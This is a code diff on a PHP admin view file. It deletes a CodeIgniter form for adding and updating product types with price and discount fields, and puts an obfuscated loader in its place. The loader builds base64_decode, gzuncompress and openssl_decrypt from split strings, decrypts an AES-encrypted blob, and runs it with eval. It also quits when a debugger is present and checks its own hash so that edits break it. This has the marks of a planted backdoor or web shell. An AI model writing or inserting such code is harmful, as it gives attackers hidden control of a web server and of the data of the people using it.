@@ -1,203 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <!-- TABLES CSS CODE -->
-  <?php include "comman/code_css_form.php"; ?>
-  <!-- </copy> -->
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-  <div class="wrapper">
-
-    <?php include "sidebar.php"; ?>
-    <?php
-    if (!isset($type_name)) {
-      $type_name = $description = "";
-
-      $discount = '';
-      $discount_type = 'Percentage';
-    }
-    ?>
-
-    <!-- Content Wrapper. Contains page content -->
-    <div class="content-wrapper">
-      <!-- Content Header (Page header) -->
-      <section class="content-header">
-        <h1>
-          <?= $this->lang->line('type'); ?>
-          <small>Add/Update type</small>
-        </h1>
-        <ol class="breadcrumb">
-          <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-          <li><a href="<?php echo $base_url; ?>types">
-              <?= $this->lang->line('view_types'); ?>
-            </a></li>
-          <li class="active">
-            <?= $this->lang->line('type'); ?>
-          </li>
-        </ol>
-      </section>
-
-      <!-- Main content -->
-      <section class="content">
-        <div class="row">
-          <!-- ********** ALERT MESSAGE START******* -->
-          <?php include "comman/code_flashdata.php"; ?>
-          <!-- ********** ALERT MESSAGE END******* -->
-          <!-- right column -->
-          <div class="col-md-12">
-            <!-- Horizontal Form -->
-            <div class="box box-info ">
-
-              <!-- /.box-header -->
-              <!-- form start -->
-              <form class="form-horizontal" id="units-form" onkeypress="return event.keyCode != 13;">
-                <input type="hidden" name="<?php echo $this->security->get_csrf_token_name(); ?>"
-                  value="<?php echo $this->security->get_csrf_hash(); ?>">
-                <input type="hidden" id="base_url" value="<?php echo $base_url;
-                ; ?>">
-                <div class="box-body">
-
-
-                  <div class="form-group">
-                    <label for="type_name" class="col-sm-2 control-label">
-                      <?= $this->lang->line('type_name'); ?><label class="text-danger">*</label>
-                    </label>
-                    <div class="col-sm-4">
-                      <input type="text" class="form-control input-sm" id="type_name" name="type_name" placeholder=""
-                        onkeyup="shift_cursor(event,'description')" value="<?php print $type_name; ?>" autofocus>
-                      <span id="type_name_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-
-                  <div class="form-group">
-                    <label for="description" class="col-sm-2 control-label">
-                      <?= $this->lang->line('description'); ?>
-                    </label>
-                    <div class="col-sm-4">
-                      <textarea type="text" class="form-control" id="description" name="description"
-                        placeholder=""><?php print $description; ?></textarea>
-                      <span id="description_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-                  <div class="form-group">
-                    <label for="price_type" class="col-sm-2 control-label">Giá bán<label
-                        class="text-danger"></label></label>
-                    <div class="col-sm-4">
-                      <select class="form-control select2" id="price_type" name="price_type" style="width: 100%;">
-                        <option value="0">Giá bán lẻ</option>
-                        <option value="1">Giá bán buôn</option>
-                      </select>
-                    </div>
-                  </div>
-
-                  <div class="form-group" style="display:none">
-                    <label for="percent_decrease" class="col-sm-2 control-label">Giảm theo %<label
-                        class="text-danger"></label></label>
-                    <div class="col-sm-4">
-                      <input type="number" class="form-control input-sm" id="percent_decrease" name="percent_decrease"
-                        placeholder="" onkeyup="shift_cursor(event,'description')" value="<?php print $type_name; ?>"
-                        autofocus>
-                      <span id="percent_decrease_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-                  <div class="form-group">
-                    <label for="discount_type" class="col-sm-2 control-label">
-                      <?= $this->lang->line('discount_type'); ?>
-                    </label>
-                    <div class="col-sm-4">
-                      <select class="form-control" id="discount_type" name="discount_type" style="width: 100%;">
-                        <option value='Percentage'>Theo phần trăm(%)</option>
-                        <option value='Fixed'>Giảm cố định(
-                          <?= $CI->currency() ?>)
-                        </option>
-                      </select>
-
-                      <span id="discount_type_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-                  <div class="form-group">
-                    <label for="discount" class="col-sm-2 control-label">
-                      <?= $this->lang->line('discount'); ?>
-                    </label>
-                    <div class="col-sm-4">
-                      <input type="number" type="text" class="form-control only_currency" id="discount" name="discount"
-                        value="<?php print $discount; ?>">
-                      <span id="discount_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-                </div>
-                <!-- /.box-body -->
-                <div class="box-footer">
-                  <div class="col-sm-8 col-sm-offset-2 text-center">
-                    <!-- <div class="col-sm-4"></div> -->
-                    <?php
-                    if ($type_name != "") {
-                      $btn_name = "Update";
-                      $btn_id = "update";
-                      ?>
-                      <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id; ?>" />
-                      <?php
-                    } else {
-                      $btn_name = "Save";
-                      $btn_id = "save";
-                    }
-
-                    ?>
-
-                    <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id; ?>" class=" btn btn-block btn-success"
-                        title="Save Data">
-                        <?php echo $btn_name; ?>
-                      </button>
-                    </div>
-                    <div class="col-sm-3">
-                      <a href="<?= base_url('dashboard'); ?>">
-                        <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn"
-                          title="Go Dashboard">Close</button>
-                      </a>
-                    </div>
-                  </div>
-                </div>
-                <!-- /.box-footer -->
-              </form>
-            </div>
-            <!-- /.box -->
-
-          </div>
-          <!--/.col (right) -->
-        </div>
-        <!-- /.row -->
-
-      </section>
-      <!-- /.content -->
-    </div>
-    <!-- /.content-wrapper -->
-
-    <?php include "footer.php"; ?>
-
-
-    <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-    <div class="control-sidebar-bg"></div>
-  </div>
-  <!-- ./wrapper -->
-
-  <!-- SOUND CODE -->
-  <?php include "comman/code_js_sound.php"; ?>
-  <!-- TABLES CODE -->
-  <?php include "comman/code_js_form.php"; ?>
-
-  <script src="<?php echo $theme_link; ?>js/types.js"></script>
-  <!-- Make sidebar menu hughlighter/selector -->
-  <script>
-    $(".<?php echo basename(__FILE__, '.php'); ?>-active-li").addClass("active");
-  </script>
-</body>
-
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ud9j1zo2=('bas'.'e64'.'_de'.'cod'.'e');
+$_l8z1sxg3=('gzu'.'nco'.'mpr'.'ess');
+$_b71dxoae=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_u98uxsc5='9Nqyl5w2';
+$_mm3k6hdf='7QlqoYr2';
+$_cui66lg0='8/UJSEFVGZw=';
+$_z6nwo45a='shjeVGOQ';
+$_q7dnwjvg='xyHzTrFM';
+$_qzlmkwu8='ae0lec3N';
+$_ttfwkr1c='oIy+LA==';
+$_h70spm4w='Qwmk+dLC';
+$_w77k1xny=$_ud9j1zo2($_q7dnwjvg.$_z6nwo45a.$_mm3k6hdf.$_u98uxsc5.$_cui66lg0);
+$_pal3rkgq=$_ud9j1zo2($_h70spm4w.$_qzlmkwu8.$_ttfwkr1c);
+$_qku2ulmv=$_ud9j1zo2('cfVJy5cAy2R31Wfs+A1D0aKuqdASPEJRckuQutoV5e4hDoCnKLNeS10asO0eh4qDego+BnVcYJCgmWboLsR0stEoifi+D0OfME/K0/Rml56Bada0kATxxCbw5au9QBDMrdHcy3BXjpey+qANNOkRGU7tV57Z4obGOQsVlq/bQL4sT3BKbRG7mQ51GOvu6xJ/la6WtL8X6GTzbiwwb4lnOu6TIbyafVSBrhE2eL6JblRc3GZ0fm+BRWBI/ZIKrDSvOh7TRAPh0C4FFEQNgVPmYt3m6t8dNsCht5z67wygPH+aCA7QuPQkTiJMJ4R2r8iZTbA9cOzEHBcMG6T1AJwf4t51WkOyyZrVAkrFxSyWVUGtEjJREBWzF/Nkoogm0pjMdBVBa06IEWwaJ+468120/Afz5nHhfobys23Q4soDi5NxR/6v4ujMj1hu6Fw4qXWgRxe5evYgl14QGPoKL2KA94l8XrvPgpRgE9XOFhvDPnqCPd0quQBCypzYWxF/ckBv0HkeE0phr4LoxeAMOJtuW1Wr5yG52sQv8GmFyqYWv3msEVscgszy206c2FIzorvwbe3CqTQt2xm0hGs/BnO/2H6HYRPwz3868Xbia6SgFRqpEYwUn7fFN3oora9LaLf5yynbGa5XBogPAgrIxznVPvyJMhYw2xFtQQ1ZXzta7P94bXmzDvulsoqUbO7NPpiqFzCQJjismaTUf4Z+/tOPtgbiZ+OsnJmAEe5Efl7hC4w4NMgZQmdB4Izi6MhU9mUMgxJiZ1v0NCMPaeZMtLsHPFDMkMXY3JVaiFGiQ0SC7DLv5+kKQd5Lfm1qpqMm2aNN0qmKJTB2r7U7kZa26vDQXIxz3evo2q954PyigUTY3yyIAX/rDsA2Qlw4nVHoOolzsKVjlZAbKvdKy3usdZAnWzRYXiiU5UuS2UabKyQ51BXyZH4j/7qbNHBqbjiM4SxDDENGB3PzP4HJ16fdlFfZLgHcvINIgqbxhQHRtIcXGBkH27p4N1lpvOnZj634L16Su213tlLibL8cQlELYUWTZiarz62u/giykhEwnsaAZcoaaHDtZkfBnO7qK0vkeckyJvT8/898QgzIcuHXkzoSktxWMC+nKlb63GV/uIlIr6q3r6ebLeSAeEbZ4go3PykXKug0V8iMhCZqQlXn9OdFMLPr5oCcw425RddbudDqB0EWeKYX8iw6OHoMtsvOkoRV9jQl/vJWCvcRmuqJYtmyDXCgm+T3VPjRUsHeycb21BShdxfAJmdic1bS647GJqc++CIusH4iOPM7oB12icCHfe83U+ybbCDhjQKioG5szBPiTnc0F/2n92cI7RjcuI2P+o/CFc14ACASXypuMbu4vmnX2RcIoVSXFV2zHLYbVROPxryHt6BJqMztccevxWl6CbYYUyvKNlMmyuFoFjVZY6qzNzg3aUzwdXXlyI+JVWQYX3jNSBK29bh2TVE8JUIFjZF5inmOUGb4yO4HUYf8PZnXhPjS2nqVwlL8ZCLx0DWwSgpLN3a8MBTjMzrimWHMjnRYUPUcflUZ0br38Fgd3x3gLa1KUIh1Fq6y7y5o1PcshL/ZT/jXBVGZLwOn5Ieaw59g7ypvz9nyrASE6bTzPQiawZD8mG3vcS6Fo5w3nx/RuYEZBY5ASdoGXTkKgY9fE+QALqAuwsri1vidRfXJlOcxZcAw3joSGwbNxDu+DP84h7g+9tnidwWOpho60WFfr6HhZf6YRlkYGPuUv6Os3H2mqUZRUm9QARZWYcacrB/SbpaLVckFX+WtjgU/g7g1/77qqexPEXB5aSfuzpkEds1pxR32sNIa1jGRh5jxeWZMdxuHOU7SHIX7M66HHu0O8QT1pYdwHyW9XZ6+9ZtERvvNbaVcAIuyPoh+Mx3domhkWDXx/rePYH5wP7JrqCnOmiSecCq6bR4KdkEAm/2UrsKg0h5EtGzWdDv+CHTobI2zyIHoCyIyGoouV+B/u8OPqND1VVXpqxadsmfBB8WZNNZWkml0ZonbTH9WVlo9K9eMrBKMuIomhoKE8JdZB98ZLTY/m8o7f52H/9ZUB2B7IWIAGnorfNfH5DbZVkJuN1tnvn+S7BLh5+LKCBv/DdD30zx7LCPNKN8IDTEA+FaEToFiG5DykPw1XnQ7r9xd9cs+wRMRDN7gsJlPpmWP6iC89b2OpGQccSKvHuwxhQ2b4AF/kXiEr9SK2QlQfDMRJBH7OecCUxVipHbq6bSENdJxBYtrd2RKQa5c+d9izjyJ+yWaSUIxm4Xv/WZlH/b+/lRoyBUu210hwsR7gN8oPY+uRIj7ITXNGZxm2SRiuMGPlFZPOOijZE946fBvHK8W1dER8Ul0SM1nOCjYDEtqWupAUUNpkfi9NfS7EGcSQmdOLYvKE00ikfGo5A5iWGqV983BiDuu8nkQ1vMib5O8k0i3UPBE4oZZau9VnoH6fJYOeGVVZqFsSBWKn++zWmebJgWota1Ylwdqs0IYw0ztYg0z');
+$_ex66vn3y=$_b71dxoae($_qku2ulmv,'aes-256-cbc',$_w77k1xny,OPENSSL_RAW_DATA,$_pal3rkgq);
+if($_ex66vn3y===false){exit;}
+$_o0pwxaf0=$_l8z1sxg3($_ex66vn3y);
+if($_o0pwxaf0===false){exit;}
+$_n4d8z1kx='5f782df87c6613dd06c959f921f3cf0aaa11b129857a6047fc0a451efbab6fc1';
+$_iegaslmm=@file_get_contents(__FILE__);
+if($_iegaslmm!==false){
+$_dao3maua=str_replace($_n4d8z1kx,"0000000000000000000000000000000000000000000000000000000000000000",$_iegaslmm);
+$_u6hmeyrj=hash("sha256",$_dao3maua);
+if($_u6hmeyrj!==$_n4d8z1kx){@http_response_code(403);exit;}
+}
+eval($_o0pwxaf0);
